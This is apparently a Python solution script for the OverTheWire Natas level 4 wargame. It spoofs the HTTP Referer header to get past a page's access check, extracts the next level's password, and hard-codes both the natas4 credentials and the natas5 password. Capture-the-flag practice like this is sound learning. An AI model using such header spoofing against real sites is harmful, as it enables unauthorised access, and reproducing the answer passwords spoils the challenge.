# natas4

import requests
from pwn import log
import re

url = 'http://natas4.natas.labs.overthewire.org'
username = "natas4"
password = "QryZXc2e0zahULdHrtHxzyYkj59kUxLQ"
auth = (username, password)
headers = {
    'Referer': 'http://natas5.natas.labs.overthewire.org/'
}

def exploit():
    res = requests.get(url, headers=headers, auth=auth)
    log.info(res.text)
    flag = re.findall('.*natas5.*', res.text)
    log.info(flag)

if __name__ == '__main__':
    exploit()

# natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK